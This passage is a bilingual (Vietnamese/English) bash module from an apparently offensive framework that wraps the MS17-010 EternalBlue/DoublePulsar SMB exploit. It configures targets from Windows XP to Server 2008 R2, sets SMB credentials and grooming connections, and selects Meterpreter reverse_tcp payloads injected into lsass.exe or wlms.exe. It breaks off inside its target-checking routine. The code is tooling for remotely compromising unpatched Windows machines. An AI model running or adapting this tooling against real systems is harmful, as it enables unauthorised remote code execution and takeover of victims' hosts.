function module_info {
if [ "$language" = "VN" ]; then
cat << !

        Tên: MS17-010 | Lỗ hổng thực thi mã từ xa Windows SMB
     Mô-đun: exploit/windows/smb/MS17-010_smb_win7_rce
   Nền tảng: Windows
  Kiến trúc: x86, x64
  Quyền hạn: Có
    Loại mã: Python & Metasploit(Ruby)
    Công bố: 14/03/2017

Cung cấp bởi:
  Shadow Brokers
  Equation Group
  sleepya
  REPTILEHAUS 
  Pablo Gonzalez ( <Pablo Gonzalez (@pablogonzalezpe)>
  Sheila A. Berta ( <Sheila A. Berta (@UnaPibaGeek)>
!
platform
  if [[ "$platform" = "python" ]] || [[ "$platform" = "PYTHON" ]] || [[ "$platform" = "Python" ]] || [[ "$platform" = "py" ]] || [[ "$platform" = "Py" ]] || [[ "$platform" = "0" ]]; then
cat << !

Mục tiêu khả dụng:

   Id  Tên
   --  ----
   0   Tự động điều chỉnh mục tiêu thông qua lấy dấu tay
       ,----------------------------------------------.
       |    Mục tiêu bao gồm các phiên bản Windows    |   
       |----------------------------------------------|
       |  Windows 7 (tất cả gói dịch vụ) (x86) (x64)  |
       |  Windows Server 2008 R2 (x86) (x64)          |
       |  Windows Server 2008 (x86) (x64)             |
       |  Windows XP (tất cả gói dịch vụ) (x86) (x64) |
       |  Windows Vista Service (x86) (x64)           |
       |  Windows Server 2003 (x86) (x64)             |
       '----------------------------------------------'
!
  else  
cat << !

Mục tiêu khả dụng:

   Id  Tên
   --  ----
   0   Windows XP (tất cả gói dịch vụ) (x86) (x64)
   1   Windows Server 2003 SP0 (x86)
   2   Windows Server 2003 SP1/SP2 (x86)
   3   Windows Server 2003 (x64)
   4   Windows Vista (x86)
   5   Windows Vista (x64)
   6   Windows Server 2008 (x86) 
   7   Windows Server 2008 R2 (x86) (x64)
   8   Windows 7 (tất cả gói dịch vụ) (x86) (x64)
!
  fi
module_compare
cat << !
Miêu tả:
#description

Tham khảo:
   https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010
   https://cvedetails.com/cve/CVE-2017-0143/
   https://cvedetails.com/cve/CVE-2017-0144/
   https://cvedetails.com/cve/CVE-2017-0145/
   https://cvedetails.com/cve/CVE-2017-0146/
   https://cvedetails.com/cve/CVE-2017-0147/
   https://cvedetails.com/cve/CVE-2017-0148/
   https://github.com/REPTILEHAUS/Eternal-Blue

Còn được biết là:
   EternalBlue DoublePulsar

!
elif [ "$language" = "EN" ]; then
cat << !

       Name: MS17-010 | Windows SMB Remote Code Execution Vulnerability
     Module: exploit/windows/smb/MS17-010_smb_win7_rce
   Platform: Windows
       Arch: x86, x64
 Privileged: Yes
  Code type: Python & Metasploit(Ruby)
  Disclosed: 14/03/2017

Provided by:
  Shadow Brokers
  Equation Group
  sleepya
  REPTILEHAUS 
!
platform
  if [[ "$platform" = "python" ]] || [[ "$platform" = "PYTHON" ]] || [[ "$platform" = "Python" ]] || [[ "$platform" = "py" ]] || [[ "$platform" = "Py" ]] || [[ "$platform" = "0" ]]; then
cat << !

Available targets:

   Id  Name
   --  ----
   0   Automatic targeting via fingerprinting
       ,----------------------------------------------.
       |    Targets includes Windows versions         |   
       |----------------------------------------------|
       |  Windows 7 (all services pack) (x86) (x64)   |
       |  Windows Server 2008 R2 (x86) (x64)          |
       |  Windows Server 2008 (x86) (x64)             |
       |  Windows XP (all services pack) (x86) (x64)  |
       |  Windows Vista Service (x86) (x64)           |
       |  Windows Server 2003 (x86) (x64)             |
       '----------------------------------------------'
!
  else  
cat << !

Available targets:

   Id  Name
   --  ----
   0   Windows XP (all services pack) (x86) (x64)
   1   Windows Server 2003 SP0 (x86)
   2   Windows Server 2003 SP1/SP2 (x86)
   3   Windows Server 2003 (x64)
   4   Windows Vista (x86)
   5   Windows Vista (x64)
   6   Windows Server 2008 (x86) 
   7   Windows Server 2008 R2 (x86) (x64)
   8   Windows 7 (all services pack) (x86) (x64)
!
  fi
module_compare
cat << !
Description:
#description

References:
   https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010
   https://cvedetails.com/cve/CVE-2017-0143/
   https://cvedetails.com/cve/CVE-2017-0144/
   https://cvedetails.com/cve/CVE-2017-0145/
   https://cvedetails.com/cve/CVE-2017-0146/
   https://cvedetails.com/cve/CVE-2017-0147/
   https://cvedetails.com/cve/CVE-2017-0148/
   https://github.com/REPTILEHAUS/Eternal-Blue

Also known as:
   EternalBlue DoublePulsar

!
fi

}
############ Hàm gán giá trị các biến #####################
function defaul_module_options {
  platform="python"
  vuln_path=`pwd`
  config_file="$vuln_path/Config/config-file"
  rm -rf $config_file > /dev/null 2>&1
  touch $config_file > /dev/null 2>&1
  rhosts=""
  rport="445"
  smbuser=""
  smbpass=""
  numgroomconn="13"
  target="8"
  rarch="x86"
  echo "arch='$rarch'" >> $config_file
  DOUBLEPULSARPATH="$path/../../Tools/Vulnerability-Exploit/MS17-010/deps"
  ETERNALBLUEPATH="$path/../../Tools/Vulnerability-Exploit/MS17-010/deps"
  PROCESSINJECT="wlms.exe"
  WINEPATH="/root/.wine/drive_c/"
  rhosts_lenght=18
}
############# Hàm kiểm tra chọn lựa để in ra màng hình ###############
function module_compare {
i_characters="i"
g_characters="g"  
_characters1="-"
_characters2="-"
################## nếu biến có độ dài nhỏ hơn 18 thì vẫn lấy giá trị 18 ###############
if [[ $rhosts_lenght -le 18 ]]; then
  rhosts_lenght=18
fi
plus_strings=$rhosts_lenght
if  [[ "$plus_strings" -le 18 ]]; then
    module1
else
    module2
fi
}
############### Hàm nhận giá trị nhận vào của biến ###################
function set_module {
  if [[ "$new_processing_variables" = "platform" ]] || [[ "$new_processing_variables" = "PLATFORM" ]] || [[ "$new_processing_variables" = "Platform" ]]; then
      if [[ "$module_set" = "python" ]] || [[ "$module_set" = "PYTHON" ]] || [[ "$module_set" = "Python" ]] || [[ "$module_set" = "py" ]] || [[ "$module_set" = "Py" ]] || [[ "$module_set" = "0" ]]; then
        unset platform
        platform="$module_set"
      elif [[ "$module_set" = "msf" ]] || [[ "$module_set" = "MSF" ]] || [[ "$module_set" = "Msf" ]] || [[ "$module_set" = "metasploit" ]] || [[ "$module_set" = "Metasploit" ]] || [[ "$module_set" = "1" ]]; then
        unset platform
        platform="$module_set"
      else  failed_to_validate=" $failed_validate'$module_set' $notvalid '$new_processing_variables'"
        echo -e "$red[-]$RESET" $failed_to_validate
      fi
    elif [[ "$new_processing_variables" = "rhosts" ]] || [[ "$new_processing_variables" = "RHOSTS" ]] || [[ "$new_processing_variables" = "Rhosts" ]] || [[ "$new_processing_variables" = "rhost" ]] || [[ "$new_processing_variables" = "RHOST" ]] || [[ "$new_processing_variables" = "Rhost" ]]; then
      unset rhosts
      rhosts="$module_set"
      rhosts_lenght=`echo $rhosts | awk '{print length}'`
      if [[ $rhosts_lenght -le 18 ]]; then
        rhosts_lenght=18
      fi
    elif [[ "$new_processing_variables" = "rport" ]] || [[ "$new_processing_variables" = "RPORT" ]] || [[ "$new_processing_variables" = "Rport" ]]; then
      unset rport
      rport="$module_set"
    elif [[ "$new_processing_variables" = "smbuser" ]] || [[ "$new_processing_variables" = "SMBUSER" ]] || [[ "$new_processing_variables" = "Smbuser" ]] || [[ "$new_processing_variables" = "smbUser" ]] || [[ "$new_processing_variables" = "SMBUser" ]]; then
      unset smbuser
      smbuser="$module_set"
    elif [[ "$new_processing_variables" = "smbpass" ]] || [[ "$new_processing_variables" = "SMBPASS" ]] || [[ "$new_processing_variables" = "Smbpass" ]] || [[ "$new_processing_variables" = "smbPass" ]] || [[ "$new_processing_variables" = "SMBPass" ]]; then
      unset smbpass
      smbpass="$module_set"
    elif [[ "$new_processing_variables" = "numgroomconn" ]] || [[ "$new_processing_variables" = "NUMGROOMCONN" ]] || [[ "$new_processing_variables" = "Numgroomconn" ]] || [[ "$new_processing_variables" = "numGroomConn" ]]; then
      unset numgroomconn
      numgroomconn="$module_set"
    elif [[ "$new_processing_variables" = "rarch" ]] || [[ "$new_processing_variables" = "RARCH" ]] || [[ "$new_processing_variables" = "Rarch" ]]; then
      if [[ "$module_set" = "x86" ]]; then
        unset rarch
        rarch="$module_set"
        echo "arch='$rarch'" >> $config_file
        payload_list
        payload="windows/x86/meterpreter/reverse_tcp"
        info_payload="$vuln_path/Framework/payloads/$payload.sh"
        source $info_payload
        defaul_payload_options
      elif [[ "$module_set" = "x64" ]]; then
        unset rarch
        rarch="$module_set"
        echo "arch='$rarch'" >> $config_file
        payload_list
        payload="windows/x64/meterpreter/reverse_tcp"
        info_payload="$vuln_path/Framework/payloads/$payload.sh"
        source $info_payload
        defaul_payload_options
      elif [[ "$module_set" = "auto" ]] || [[ "$module_set" = "AUTO" ]] || [[ "$module_set" = "Auto" ]]; then
          if [[ "$platform" = "python" ]] || [[ "$platform" = "PYTHON" ]] || [[ "$platform" = "Python" ]] || [[ "$platform" = "py" ]] || [[ "$platform" = "Py" ]] || [[ "$platform" = "0" ]]; then
            unset rarch
            rarch="$module_set"
            echo "arch='$rarch'" >> $config_file
            payload_list
            payload="windows/auto/meterpreter/reverse_tcp"
            info_payload="$vuln_path/Framework/payloads/$payload.sh"
            source $info_payload
            defaul_payload_options
          else
            rarch="x86"
            echo "arch='x86'" >> $config_file
            failed_to_validate=" $failed_validate'$module_set' $notvalid '$new_processing_variables'"
            echo -e "$red[-]$RESET" $failed_to_validate
            payload_list
            payload="windows/x86/meterpreter/reverse_tcp"
            info_payload="$vuln_path/Framework/payloads/$payload.sh"
            source $info_payload
            defaul_payload_options 
          fi
      else  failed_to_validate=" $failed_validate'$module_set' $notvalid '$new_processing_variables'"
        echo -e "$red[-]$RESET" $failed_to_validate
      fi
	elif [[ "$new_processing_variables" = "target" ]] || [[ "$new_processing_variables" = "TARGET" ]] || [[ "$new_processing_variables" = "Target" ]]; then
		if [[ "$module_set" = "0" ]] || [[ "$module_set" = "1" ]] || [[ "$module_set" = "2" ]] || [[ "$module_set" = "3" ]] || [[ "$module_set" = "4" ]] || [[ "$module_set" = "5" ]] || [[ "$module_set" = "6" ]] || [[ "$module_set" = "7" ]] || [[ "$module_set" = "8" ]]; then
			unset target
			target="$module_set"
		else 	failed_to_validate=" $failed_validate'$module_set' $notvalid '$new_processing_variables'"
			echo -e "$red[-]$RESET" $failed_to_validate
		fi
    fi
}

##################### Hàm canh lề cho biến ###################
############# Khi các biến có độ dài nhỏ hơn 18 ###############
function module1 {
none=" "
myvar=""
  function unset_value {
    unset none
    unset myvar
    unset integer
    none=" "
    myvar=""
  }
rhosts=`echo $rhosts`
rhosts_lenght=`echo $rhosts | awk '{print length}'`
  integer=`expr 20 - $rhosts_lenght`     
  for (( i = 0 ; i < $integer; i++ )) do
    myvar=$myvar$none
  done
  rhosts=$rhosts$myvar
unset_value
rport=`echo $rport`
rport_lenght=`echo $rport | awk '{print length}'`
  integer=`expr 20 - $rport_lenght`     
  for (( i = 0 ; i < $integer; i++ )) do
    myvar=$myvar$none
  done
  rport=$rport$myvar
unset_value
smbuser=`echo $smbuser`
smbuser_lenght=`echo $smbuser | awk '{print length}'`
  integer=`expr 20 - $smbuser_lenght`     
  for (( i = 0 ; i < $integer; i++ )) do
    myvar=$myvar$none
  done
  smbuser=$smbuser$myvar
unset_value
smbpass=`echo $smbpass`
smbpass_lenght=`echo $smbpass | awk '{print length}'`
  integer=`expr 20 - $smbpass_lenght`     
  for (( i = 0 ; i < $integer; i++ )) do
    myvar=$myvar$none
  done
  smbpass=$smbpass$myvar
unset_value
numgroomconn=`echo $numgroomconn`
numgroomconn_lenght=`echo $numgroomconn | awk '{print length}'`
  integer=`expr 20 - $numgroomconn_lenght`      
  for (( i = 0 ; i < $integer; i++ )) do
    myvar=$myvar$none
  done
  numgroomconn=$numgroomconn$myvar
unset_value
rarch=`echo $rarch`
if [[ "$platform" = "msf" ]] || [[ "$platform" = "MSF" ]] || [[ "$platform" = "Msf" ]] || [[ "$platform" = "metasploit" ]] || [[ "$platform" = "Metasploit" ]] || [[ "$platform" = "1" ]]; then
  if [[ "$rarch" = "auto" ]] || [[ "$rarch" = "AUTO" ]] || [[ "$rarch" = "Auto" ]]; then
    rarch="x86"
  fi
fi
rarch_lenght=`echo $rarch | awk '{print length}'`
  integer=`expr 20 - $rarch_lenght`     
  for (( i = 0 ; i < $integer; i++ )) do
    myvar=$myvar$none
  done
  rarch=$rarch$myvar
unset_value
module_banner_1
}
function module2 {
none=" "
myvar=""
  function unset_value {
    unset none
    unset myvar
    unset subtract_compare_value
    none=" "
    myvar=""
  }
rhosts=`echo $rhosts`
rhosts_lenght=`echo $rhosts | awk '{print length}'`
integer=3
for (( i = 0 ; i < $integer; i++ )) do
  myvar=$myvar$none
done
rhosts=$rhosts$myvar
greater_value=$rhosts_lenght
unset_value
rport=`echo $rport`
rport_lenght=`echo $rport | awk '{print length}'`
subtract_compare_value=`expr $greater_value - $rport_lenght + 3`  
  for (( i = 0 ; i < $subtract_compare_value; i++ )) do
    myvar=$myvar$none
  done
  rport=$rport$myvar
unset_value
smbuser=`echo $smbuser`
smbuser_lenght=`echo $smbuser | awk '{print length}'`
subtract_compare_value=`expr $greater_value - $smbuser_lenght + 3`  
  for (( i = 0 ; i < $subtract_compare_value; i++ )) do
    myvar=$myvar$none
  done
  smbuser=$smbuser$myvar
unset_value
smbpass=`echo $smbpass`
smbpass_lenght=`echo $smbpass | awk '{print length}'`
subtract_compare_value=`expr $greater_value - $smbpass_lenght + 3`  
  for (( i = 0 ; i < $subtract_compare_value; i++ )) do
    myvar=$myvar$none
  done
  smbpass=$smbpass$myvar
unset_value
numgroomconn=`echo $numgroomconn`
numgroomconn_lenght=`echo $numgroomconn | awk '{print length}'`
subtract_compare_value=`expr $greater_value - $numgroomconn_lenght + 3` 
  for (( i = 0 ; i < $subtract_compare_value; i++ )) do
    myvar=$myvar$none
  done
  numgroomconn=$numgroomconn$myvar
unset_value
rarch=`echo $rarch`
if [[ "$platform" = "msf" ]] || [[ "$platform" = "MSF" ]] || [[ "$platform" = "Msf" ]] || [[ "$platform" = "metasploit" ]] || [[ "$platform" = "Metasploit" ]] || [[ "$platform" = "1" ]]; then
  if [[ "$rarch" = "auto" ]] || [[ "$rarch" = "AUTO" ]] || [[ "$rarch" = "Auto" ]]; then
    rarch="x86"
  fi
fi
rarch_lenght=`echo $rarch | awk '{print length}'`
subtract_compare_value=`expr $greater_value - $rarch_lenght + 3`  
  for (( i = 0 ; i < $subtract_compare_value; i++ )) do
    myvar=$myvar$none
  done
  rarch=$rarch$myvar
unset_value
subtract_compare_value=`expr $greater_value - 17 + 4`
for (( i = 0 ; i < $subtract_compare_value; i++ )) do
    myvar=$myvar$none
  done
  i_characters=$i_characters$myvar
unset_value
subtract_compare_value=`expr $greater_value - 15 + 4`
for (( i = 0 ; i < $subtract_compare_value; i++ )) do
    myvar=$myvar$none
  done
  g_characters=$g_characters$myvar
unset_value
subtract_compare_value=`expr $greater_value - 16 + 5`
for (( i = 0 ; i < $subtract_compare_value; i++ )) do
    myvar=$myvar$none
  done
  _characters1=$_characters1$myvar
unset_value
subtract_compare_value=`expr $greater_value - 14 + 3`
for (( i = 0 ; i < $subtract_compare_value; i++ )) do
    myvar=$myvar$none
  done
  _characters2=$_characters2$myvar
unset_value

module_banner_2
}
function module_banner_1 {
if [[ "$platform" = "python" ]] || [[ "$platform" = "PYTHON" ]] || [[ "$platform" = "Python" ]] || [[ "$platform" = "py" ]] || [[ "$platform" = "Py" ]] || [[ "$platform" = "0" ]]; then
  if [ "$language" = "VN" ]; then
yes="   Có"
no="   Không"
cat << !

Các tùy chọn của mô-đun (exploit/windows/smb/MS17-010_smb_win7_rce):

   Tên            Thiết lập hiện tại     Yêu cầu   Miêu tả
   ----           ---------------        --------  -----------
   RHOSTS         $rhosts $yes       Địa chỉ hoặc tên miền của máy chủ mục tiêu.
   RPORT          $rport $no    Cổng dịch vụ máy chủ SMB đang chạy.
   RARCH          $rarch $yes       Kiến trúc trên máy mục tiêu (Được chấp nhận: x86, x64, auto).
   numGroomConn   $numgroomconn $no    Số Groom kết nối đến.
   SMBUser        $smbuser $no    (Tùy chọn) Tên người dùng smb để xác thực.
   SMBPass        $smbpass $no    (Tùy chọn) Mật khẩu cho tên người dùng được chỉ định.

!
  elif [ "$language" = "EN" ]; then
yes="  yes"
no="  no "
cat << !

Module options (exploit/windows/smb/MS17-010_smb_win7_rce):

   Name           Current Setting       Required  Description
   ----           ---------------       --------  -----------
   RHOSTS         $rhosts $yes      Address or domain name of target server.
   RPORT          $rport $no      The SMB server service port is running.
   RARCH          $rarch $yes      Target Architecture (Accepted: x86, x64, auto).
   numGroomConn   $numgroomconn $no      num Groom connection to.
   SMBUser        $smbuser $no      (Optional) The Username to authenticate as.
   SMBPass        $smbpass $no      (Optional) The Password for the specified username.

!
  fi
else
  if [ "$language" = "VN" ]; then
yes="   Có"
no="   Không"
cat << !

Các tùy chọn của mô-đun (exploit/windows/smb/MS17-010_smb_win7_rce):

   Tên            Thiết lập hiện tại     Yêu cầu   Miêu tả
   ----           ---------------        --------  -----------
   RHOSTS         $rhosts $yes       Địa chỉ hoặc tên miền của máy chủ mục tiêu.
   RPORT          $rport $no    Cổng dịch vụ máy chủ SMB đang chạy.
   RARCH          $rarch $yes       Kiến trúc trên máy mục tiêu (Được chấp nhận: x86, x64).

!
  elif [ "$language" = "EN" ]; then
yes="  yes"
no="  no "
cat << !

Module options (exploit/windows/smb/MS17-010_smb_win7_rce):

   Name           Current Setting       Required  Description
   ----           ---------------       --------  -----------
   RHOSTS         $rhosts $yes      Address or domain name of target server.
   RPORT          $rport $no      The SMB server service port is running.
   RARCH          $rarch $yes      Target Architecture (Accepted: x86, x64).

!
  fi
fi
}
function module_banner_2 {
if [[ "$platform" = "python" ]] || [[ "$platform" = "PYTHON" ]] || [[ "$platform" = "Python" ]] || [[ "$platform" = "py" ]] || [[ "$platform" = "Py" ]] || [[ "$platform" = "0" ]]; then
  if [ "$language" = "VN" ]; then
yes="  Có"
no="  Không"
cat << !

Các tùy chọn của mô-đun (exploit/windows/smb/MS17-010_smb_win7_rce):

   Tên            Thiết lập hiện tạ${i_characters}Yêu cầu   Miêu tả
   ----           ---------------${_characters1}--------  -----------
   RHOSTS         $rhosts $yes       Địa chỉ hoặc tên miền của máy chủ mục tiêu.
   RPORT          $rport $no    Cổng dịch vụ máy chủ SMB đang chạy.
   RARCH          $rarch $yes       Kiến trúc trên máy mục tiêu (Được chấp nhận: x86, x64, auto).
   numGroomConn   $numgroomconn $no    Số Groom kết nối đến.
   SMBUser        $smbuser $no    (Tùy chọn) Tên người dùng smb để xác thực.
   SMBPass        $smbpass $no    (Tùy chọn) Mật khẩu cho tên người dùng được chỉ định.

!
  elif [ "$language" = "EN" ]; then
yes="  yes"
no="  no "
cat << !

Module options (exploit/windows/smb/MS17-010_smb_win7_rce):

   Name           Current Setting${g_characters}Required  Description
   ----           ---------------${_characters2}--------  -----------
   RHOSTS         $rhosts $yes      Address or domain name of target server.
   RPORT          $rport $no      The SMB server service port is running.
   RARCH          $rarch $yes      Target Architecture (Accepted: x86, x64, auto).
   numGroomConn   $numgroomconn $no      num Groom connection to.
   SMBUser        $smbuser $no      (Optional) The Username to authenticate as.
   SMBPass        $smbpass $no      (Optional) The Password for the specified username.

!
  fi
else
  if [ "$language" = "VN" ]; then
yes="  Có"
no="  Không"
cat << !

Các tùy chọn của mô-đun (exploit/windows/smb/MS17-010_smb_win7_rce):

   Tên            Thiết lập hiện tạ${i_characters}Yêu cầu   Miêu tả
   ----           ---------------${_characters1}--------  -----------
   RHOSTS         $rhosts $yes       Địa chỉ hoặc tên miền của máy chủ mục tiêu.
   RPORT          $rport $no    Cổng dịch vụ máy chủ SMB đang chạy.
   RARCH          $rarch $yes       Kiến trúc trên máy mục tiêu (Được chấp nhận: x86, x64).

!
  elif [ "$language" = "EN" ]; then
yes="  yes"
no="  no "
cat << !

Module options (exploit/windows/smb/MS17-010_smb_win7_rce):

   Name           Current Setting${g_characters}Required  Description
   ----           ---------------${_characters2}--------  -----------
   RHOSTS         $rhosts $yes      Address or domain name of target server.
   RPORT          $rport $no      The SMB server service port is running.
   RARCH          $rarch $yes      Target Architecture (Accepted: x86, x64).

!
  fi
fi
    
}
function show_platforms {
if [ "$language" = "VN" ]; then
echo -e """
Nền tảng mã khai thác:

   Id  Tên
   --  ----
   0   ${BlueF}Py${yellow}thon${RESET}
   1   ${red}Metasploit${RESET}(${red}Ruby${RESET})
"""
elif [ "$language" = "EN" ]; then
echo -e """
Exploit code platform:

   Id  Name
   --  ----
   0   ${BlueF}Py${yellow}thon${RESET}
   1   ${red}Metasploit${RESET}(${red}Ruby${RESET})
"""
fi
}
function platform {
if [[ "$platform" = "python" ]] || [[ "$platform" = "PYTHON" ]] || [[ "$platform" = "Python" ]] || [[ "$platform" = "py" ]] || [[ "$platform" = "Py" ]] || [[ "$platform" = "0" ]]; then
  if [ "$language" = "VN" ]; then
echo -ne """
Nền tảng được chọn:

   Id  Tên
   --  ----
   0   ${BlueF}Py${yellow}thon${RESET}
"""
  elif [ "$language" = "EN" ]; then
echo -ne """
Platform selected:

   Id  Name
   --  ----
   0   ${BlueF}Py${yellow}thon${RESET}
"""
  fi
else
  if [ "$language" = "VN" ]; then
echo -ne """
Nền tảng được chọn:

   Id  Tên
   --  ----
   1   ${red}Metasploit${RESET}(${red}Ruby${RESET})
"""
  elif [ "$language" = "EN" ]; then
echo -ne """
Platform selected:

   Id  Name
   --  ----
   1   ${red}Metasploit${RESET}(${red}Ruby${RESET})
"""
  fi
fi
}
################# targets ###################
#############################################
function show_targets {
if [[ "$platform" = "python" ]] || [[ "$platform" = "PYTHON" ]] || [[ "$platform" = "Python" ]] || [[ "$platform" = "py" ]] || [[ "$platform" = "Py" ]] || [[ "$platform" = "0" ]]; then
  if [ "$language" = "VN" ]; then
cat << !

Các mục tiêu có thể khai thác:

   Id  Tên
   --  ----
   0   Tự động điều chỉnh mục tiêu thông qua lấy dấu tay
       ,----------------------------------------------.
       |    Mục tiêu bao gồm các phiên bản Windows    |   
       |----------------------------------------------|
       |  Windows 7 (tất cả gói dịch vụ) (x86) (x64)  |
       |  Windows Server 2008 R2 (x86) (x64)          |
       |  Windows Server 2008 (x86) (x64)             |
       |  Windows XP (tất cả gói dịch vụ) (x86) (x64) |
       |  Windows Vista Service (x86) (x64)           |
       |  Windows Server 2003 (x86) (x64)             |
       '----------------------------------------------'

!
  elif [ "$language" = "EN" ]; then
cat << !

Exploit targets:

   Id  Name
   --  ----
   0   Automatic targeting via fingerprinting
       ,----------------------------------------------.
       |    Targets includes Windows versions         |   
       |----------------------------------------------|
       |  Windows 7 (all services pack) (x86) (x64)   |
       |  Windows Server 2008 R2 (x86) (x64)          |
       |  Windows Server 2008 (x86) (x64)             |
       |  Windows XP (all services pack) (x86) (x64)  |
       |  Windows Vista Service (x86) (x64)           |
       |  Windows Server 2003 (x86) (x64)             |
       '----------------------------------------------'

!
  fi
else
  if [ "$language" = "VN" ]; then
cat << !

Các mục tiêu có thể khai thác:

   Id  Tên
   --  ----
   0   Windows XP (tất cả gói dịch vụ) (x86) (x64)
   1   Windows Server 2003 SP0 (x86)
   2   Windows Server 2003 SP1/SP2 (x86)
   3   Windows Server 2003 (x64)
   4   Windows Vista (x86)
   5   Windows Vista (x64)
   6   Windows Server 2008 (x86) 
   7   Windows Server 2008 R2 (x86) (x64)
   8   Windows 7 (tất cả gói dịch vụ) (x86) (x64)

!
  elif [ "$language" = "EN" ]; then
cat << !

Exploit targets:

   Id  Name
   --  ----
   0   Windows XP (all services pack) (x86) (x64)
   1   Windows Server 2003 SP0 (x86)
   2   Windows Server 2003 SP1/SP2 (x86)
   3   Windows Server 2003 (x64)
   4   Windows Vista (x86)
   5   Windows Vista (x64)
   6   Windows Server 2008 (x86) 
   7   Windows Server 2008 R2 (x86) (x64)
   8   Windows 7 (all services pack) (x86) (x64)

!
  fi
fi
}

function target {
if [[ "$platform" = "python" ]] || [[ "$platform" = "PYTHON" ]] || [[ "$platform" = "Python" ]] || [[ "$platform" = "py" ]] || [[ "$platform" = "Py" ]] || [[ "$platform" = "0" ]]; then
  if [ "$language" = "VN" ]; then
cat << !
Mục tiêu khai thác:

   Id  Tên
   --  ----
   0   Tự động điều chỉnh mục tiêu thông qua lấy dấu tay

!
  elif [ "$language" = "EN" ]; then
cat << !

Exploit target:

   Id  Name
   --  ----
   0   Automatic targeting via fingerprinting

!
  fi
else
  if [ "$language" = "VN" ]; then
    if [ "$target" = "0" ]; then
cat << !
Mục tiêu khai thác:

   Id  Tên
   --  ----
   0   Windows XP (tất cả gói dịch vụ) (x86) (x64)

!
    elif [ "$target" = "1" ]; then
cat << !
Mục tiêu khai thác:

   Id  Tên
   --  ----
   1   Windows Server 2003 SP0 (x86)

!
    elif [ "$target" = "2" ]; then
cat << !
Mục tiêu khai thác:

   Id  Tên
   --  ----
   2   Windows Server 2003 SP1/SP2 (x86)

!
    elif [ "$target" = "3" ]; then
cat << !
Mục tiêu khai thác:

   Id  Tên
   --  ----
   3   Windows Server 2003 (x64)

!
    elif [ "$target" = "4" ]; then
cat << !
Mục tiêu khai thác:

   Id  Tên
   --  ----
   4   Windows Vista (x86)

!
    elif [ "$target" = "5" ]; then
cat << !
Mục tiêu khai thác:

   Id  Tên
   --  ----
   5   Windows Vista (x64)

!
    elif [ "$target" = "6" ]; then
cat << !
Mục tiêu khai thác:

   Id  Tên
   --  ----
   6   Windows Server 2008 (x86) 

!
    elif [ "$target" = "7" ]; then
cat << !
Mục tiêu khai thác:

   Id  Tên
   --  ----
   7   Windows Server 2008 R2 (x86) (x64)

!
    elif [ "$target" = "8" ]; then
cat << !
Mục tiêu khai thác:

   Id  Tên
   --  ----
   8   Windows 7 (tất cả gói dịch vụ) (x86) (x64)

!
    fi
  elif [ "$language" = "EN" ]; then
    if [ "$target" = "0" ]; then
cat << !
Exploit target:

   Id  Name
   --  ----
   0   Windows XP (all services pack) (x86) (x64)

!
    elif [ "$target" = "1" ]; then
cat << !
Exploit target:

   Id  Name
   --  ----
   1   Windows Server 2003 SP0 (x86)

!
    elif [ "$target" = "2" ]; then
cat << !
Exploit target:

   Id  Name
   --  ----
   2   Windows Server 2003 SP1/SP2 (x86)

!
    elif [ "$target" = "3" ]; then
cat << !
Exploit target:

   Id  Name
   --  ----
   3   Windows Server 2003 (x64)

!
    elif [ "$target" = "4" ]; then
cat << !
Exploit target:

   Id  Name
   --  ----
   4   Windows Vista (x86)

!
    elif [ "$target" = "5" ]; then
cat << !
Exploit target:

   Id  Name
   --  ----
   5   Windows Vista (x64)

!
    elif [ "$target" = "6" ]; then
cat << !
Exploit target:

   Id  Name
   --  ----
   6   Windows Server 2008 (x86) 

!
    elif [ "$target" = "7" ]; then
cat << !
Exploit target:

   Id  Name
   --  ----
   7   Windows Server 2008 R2 (x86) (x64)

!
    elif [ "$target" = "8" ]; then
cat << !
Exploit target:

   Id  Name
   --  ----
   8   Windows 7 (all services pack) (x86) (x64)

!
    fi
  fi
fi
}
################# payload list ###################
#############################################
function payload_list {
path_present=`pwd`
source $config_file
payload_list_file="$path_present/Config/payloads"
rm -rf $payload_list_file
touch $payload_list_file
if [[ "$arch" = "x86" ]]; then
  cat $payload_data | grep -i "   generic/" > $payload_list_file
  cat $payload_data | grep -i "   windows/" >> $payload_list_file
  echo "" >> $payload_list_file
elif [[ "$arch" = "x64" ]]; then
  cat $payload_data | grep -i "   generic/" > $payload_list_file
  cat $payload_data | grep -i "   windows/x64" >> $payload_list_file
  echo "" >> $payload_list_file
else
  cat $payload_data | grep -i "   windows/auto" > $payload_list_file
  echo "" >> $payload_list_file
fi
}
function out_value {
rhosts=`echo $rhosts`
rport=`echo $rport`
smbuser=`echo $smbuser`
if [[ "$smbuser" = "" ]]; then
	smbuser="."
fi
smbpass=`echo $smbpass`
if [[ "$smbpass" = "" ]]; then
	smbpass="."
fi
numgroomconn=`echo $numgroomconn`
target=`echo $target`
rarch=`echo $rarch`
if [[ "$rarch" = "x64" ]];then
  PROCESSINJECT="lsass.exe"
else
  PROCESSINJECT="wlms.exe"
fi
if [[ "$rarch" != "x86" ]] || [[ "$rarch" != "x64" ]]; then
  lport1=`echo $lport1`
  lport2=`echo $lport2`
  paylo1=`echo $paylo1`
  paylo2=`echo $paylo2`
  paylo=`echo $paylo`
else
  lport=`echo $lport`
  paylo=`echo $paylo`
fi
if [[ "$lhost" = "" ]]; then
	lhost=$local_ip
else
	lhost=`echo $lhost`
fi
file_ip="ip.txt"
}
function check {
rhosts=`echo $rhosts`
rport=`echo $rport`
path_present=`pwd`
path_tool="../../Tools/Vulnerability-Exploit/MS17-010/"
file_ip="ip.txt"
file_attack_ip="attack_ip.txt"
timeout="3"
cd $path_tool
rm -rf $file_ip > /dev/null 2>&1
touch $file_ip > /dev/null 2>&1
rm -rf $file_attack_ip > /dev/null 2>&1
touch $file_attack_ip > /dev/null 2>&1
check_none_rhosts=`echo $rhosts`
check_rhosts=`echo $rhosts | grep -e ";"`
if [[ "$check_rhosts" != "" ]]; then
  check_run=1
	for (( i = 1 ; i <= 1000000; i++ )) do
		new_rhosts=`echo $rhosts | cut -d';' -f$i`
		if [[ "$new_rhosts" != "" ]]; then
      if [[ "$new_rhosts" =~ ^(([1-9]?[0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-5]))\.){3}([1-9]?[0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-5]))$ ]]; then
			 echo "$new_rhosts" >> $file_ip
      else
        echo -e "${red}[-]$RESET $new_rhosts $not_format"
      fi
		else
			break
		fi
	done		
elif [[ "$check_rhosts" = "" ]]; then
	if [[ "$check_none_rhosts" != "" ]]; then
		rhosts_analysis=${rhosts##*.} > /dev/null 2>&1
